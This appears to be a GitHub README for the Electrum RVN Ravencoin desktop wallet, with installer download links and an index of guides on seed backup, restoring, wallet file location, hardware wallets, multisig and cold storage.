![Electrum RVN](assets/banner-hub.png)

<h1 align="center">Electrum RVN</h1>

<p align="center"><strong>Keep the keys, or recover what the keys protected</strong></p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0"><img src="https://img.shields.io/badge/RELEASE-v4.8.0-384182?style=for-the-badge&labelColor=131A38" alt="Release v4.8.0"></a> <a href="https://github.com/electrum-source/Electrum-RVN/blob/2.9.x/LICENCE"><img src="https://img.shields.io/badge/LICENSE-MIT-F05239?style=for-the-badge&labelColor=131A38" alt="License MIT"></a></p>

---

## Downloads - v4.8.0

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

---


## What this repository is for

You already hold RVN somewhere and the question that keeps you up is what happens when the machine dies, the password is forgotten, or the file is gone. This repository covers the whole protective half of the wallet: the twelve-word seed, where the wallet file actually lives, what a restore does and does not bring back, how a hardware wallet changes the signing step, and how a cold-storage or multisig arrangement keeps one seed from being the only thing between you and a permanent loss.
It deliberately does not teach installation, address formats, fees or asset issuance; those belong to the setup and network repositories, and mixing them in would put recovery instructions in front of a reader who has not yet made a wallet. One boundary matters more than the rest: nothing in these pages asks for your seed, and any screen or message that does is not part of the wallet.

## Who it is for

- You restored a wallet and the balance shows zero, and you need to know why before you panic.
- You have a Ledger or a Trezor and want signing to stay on the device.
- You want a cold-storage or multisig setup that survives one lost key.
- You are moving to a new computer and need the file and the words to arrive together.

## Start here

<div align="center">

| Guide | What it answers |
| --- | --- |
| [How Safe Is Electrum RVN?](https://github.com/electrum-source/passphrase-backup/blob/main/how-safe-is-electrum-rvn.md) | Safety here means the seed stays offline and the file stays encrypted, not that any wallet can promise no loss. |
| [Where Electrum RVN Stores Your Wallet File](https://github.com/electrum-source/passphrase-backup/blob/main/where-electrum-rvn-stores-your-wallet.md) | The wallet file lives in your user profile rather than the program folder, which is why reinstalling does not erase it. |
| [Backing Up an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md) | Write the twelve words on paper at creation time, because a screenshot or a note on the same disk is not a backup. |
| [Restore a Wallet From an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/restore-a-wallet-from-an-electrum-rvn-seed.md) | Restoring replays the words into a new wallet file, then waits for the addresses to be discovered on the chain. |

</div>

## How to use these guides

1. Start with the backup guide if the wallet is new, because the seed must exist before anything else matters.
2. Read where the wallet file lives, so a reinstall, a move or a cleanup never takes it by surprise.
3. Keep the restore guide open the first time you test a backup, and restore to a second wallet rather than the live one.
4. Move to the zero-balance and forgotten-password guides only when a restore has actually gone wrong.
5. Add hardware signing, watch-only, multisig or cold storage once the single-seed setup is proven.

## The guides

Every guide in this repository is listed below, grouped by the question it answers.

### Before anything goes wrong

<div align="center">

| Guide | What it answers |
| --- | --- |
| [How Safe Is Electrum RVN?](https://github.com/electrum-source/passphrase-backup/blob/main/how-safe-is-electrum-rvn.md) | Safety here means the seed stays offline and the file stays encrypted, not that any wallet can promise no loss. |
| [Electrum RVN Security and Audit Status](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-security-audit.md) | The project describes its builds as audited and signed, and this page explains what that claim does and does not cover. |
| [How to Verify an Electrum RVN Download](https://github.com/electrum-source/passphrase-backup/blob/main/how-to-verify-an-electrum-rvn-download.md) | Check the SHA-256 of the installer against the release page before you run it, so a swapped file fails loudly. |
| [Where Electrum RVN Stores Your Wallet File](https://github.com/electrum-source/passphrase-backup/blob/main/where-electrum-rvn-stores-your-wallet.md) | The wallet file lives in your user profile rather than the program folder, which is why reinstalling does not erase it. |
| [Does Electrum RVN Collect Personal Data?](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-data-collection.md) | The wallet asks for no account and reports no telemetry, so the servers learn only what a light client must ask. |
| [Wallet File Encryption in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/wallet-file-encryption-in-electrum-rvn.md) | The wallet file is encrypted with your password, and keys are decrypted in memory only while a signature is made. |

</div>

### Back up and restore

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Backing Up an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md) | Write the twelve words on paper at creation time, because a screenshot or a note on the same disk is not a backup. |
| [Storing Your Electrum RVN Seed Offline](https://github.com/electrum-source/passphrase-backup/blob/main/storing-your-electrum-rvn-seed-offline.md) | Store the written seed away from the machine and from anything synced to a cloud account you do not control. |
| [Restore a Wallet From an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/restore-a-wallet-from-an-electrum-rvn-seed.md) | Restoring replays the words into a new wallet file, then waits for the addresses to be discovered on the chain. |
| [Zero Balance After Restoring Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/zero-balance-after-restoring-electrum-rvn.md) | A zero balance after a restore usually means a different seed, a different account branch or a server that has not caught up. |
| [Forgot Your Electrum RVN Password](https://github.com/electrum-source/passphrase-backup/blob/main/forgot-your-electrum-rvn-password.md) | A forgotten password cannot be reset, so recovery means restoring from the seed and setting a new one. |
| [Electrum RVN Recovery Without the Seed](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-recovery-without-the-seed.md) | Without the seed, the wallet file and its password are the only path, and a lost pair leaves nothing to recover. |

</div>

### Keys, devices and cold storage

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Import a Hardware Wallet Seed Into Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/import-a-hardware-wallet-seed-into-electrum-rvn.md) | Importing a hardware wallet seed into software defeats the device, so restore it back onto hardware instead. |
| [Export Private Keys From Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/export-private-keys-from-electrum-rvn.md) | Exporting keys moves control out of the encrypted file, so do it on an offline machine and treat the export as cash. |
| [Moving Electrum RVN to Another Computer](https://github.com/electrum-source/passphrase-backup/blob/main/moving-electrum-rvn-to-another-computer.md) | Move by restoring the seed on the new machine, or by copying the encrypted file and its password together. |
| [Electrum RVN Cold Storage Workflow](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-cold-storage-workflow.md) | A cold setup keeps the signing machine offline and watches the same addresses from a connected watch-only wallet. |
| [Watch-Only Wallets in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/watch-only-wallets-in-electrum-rvn.md) | A watch-only wallet holds public keys only, so it can build and track transactions but never sign one. |
| [Multisig Wallets in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/multisig-wallets-in-electrum-rvn.md) | A multisig wallet needs several keys to spend, which removes the single seed as the only point of failure. |

</div>

### Hardware signing, in practice

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Pairing a Ledger With Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/pairing-a-ledger-with-electrum-rvn.md) | Pairing a Ledger keeps the keys on the device while the wallet builds and broadcasts the transaction for it. |
| [Using a Trezor With Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/using-a-trezor-with-electrum-rvn.md) | Using a Trezor follows the same split, with the device signing and the wallet handling the connection and the fee. |
| [Ledger Not Detected by Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/ledger-not-detected-by-electrum-rvn.md) | When the Ledger is not detected, the cable, the device app and the browser bridge are the three usual causes. |
| [Trezor Not Detected by Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/trezor-not-detected-by-electrum-rvn.md) | A Trezor that is not detected usually needs its bridge, its firmware or a different USB port before anything else. |

</div>

## What each guide changes

<div align="center">

| Task | Guide | Outcome |
| --- | --- | --- |
| Back up the seed | [Backing Up an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md) | Twelve words exist on paper, in your handwriting, stored away from the machine and from any synced note. |
| Prove the restore | [Restore a Wallet From an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/restore-a-wallet-from-an-electrum-rvn-seed.md) | A second wallet rebuilt from the words shows the same addresses, so the backup is known to work. |
| Find the file | [Where Electrum RVN Stores Your Wallet File](https://github.com/electrum-source/passphrase-backup/blob/main/where-electrum-rvn-stores-your-wallet.md) | You can name the folder that holds the encrypted file and say what deleting it would destroy. |
| Recover a lost password | [Forgot Your Electrum RVN Password](https://github.com/electrum-source/passphrase-backup/blob/main/forgot-your-electrum-rvn-password.md) | The old file is set aside, a new password protects a restored wallet, and the coins are reachable again. |
| Add a hardware wallet | [Pairing a Ledger With Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/pairing-a-ledger-with-electrum-rvn.md) | Signing happens on the device and the wallet only builds and broadcasts the transaction. |
| Build a cold setup | [Electrum RVN Cold Storage Workflow](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-cold-storage-workflow.md) | An offline machine signs and a connected watch-only wallet tracks the same addresses without holding keys. |

</div>

## Common first questions

### Can support reset my password?

No. The wallet is non-custodial and nobody holds a copy of the file or the password, so recovery always runs through the seed or the encrypted file.

### Is a screenshot of the seed a backup?

It is a copy on a device that is usually online and usually synced, which is why the guides treat paper kept away from the machine as the backup and everything else as exposure.

### Why does a restore show zero?

The most common causes are a different seed, a different account branch inside the wallet, or a server that has not yet indexed your addresses, and each has its own check.

### Do I still need the seed with a hardware wallet?

Yes. The device holds the keys, so its own recovery phrase becomes the only path if the device is lost or destroyed.

### What does the audit claim cover?

The project describes its builds as audited and signed, and the security page explains which questions that answers and which it leaves to your own verification.

## Before you install

The wallet is non-custodial: nobody can reset a password, reverse a send or restore a seed. Download only from the release page, compare the checksum before running the file, and write the twelve words down before the first coin arrives.

## About

Electrum RVN is an independent desktop wallet for Ravencoin, published from the [main repository](https://github.com/electrum-source/Electrum-RVN) and licensed MIT. These guides describe the current public release only, and every command and screen they name is one a reader can reach from the release page.

## License

The guides and the code base are MIT-licensed.

## More guides

[download and setup](https://github.com/electrum-source/download-and-setup#readme) | [token and network](https://github.com/electrum-source/token-and-network#readme) | [main repository](https://github.com/electrum-source/Electrum-RVN)
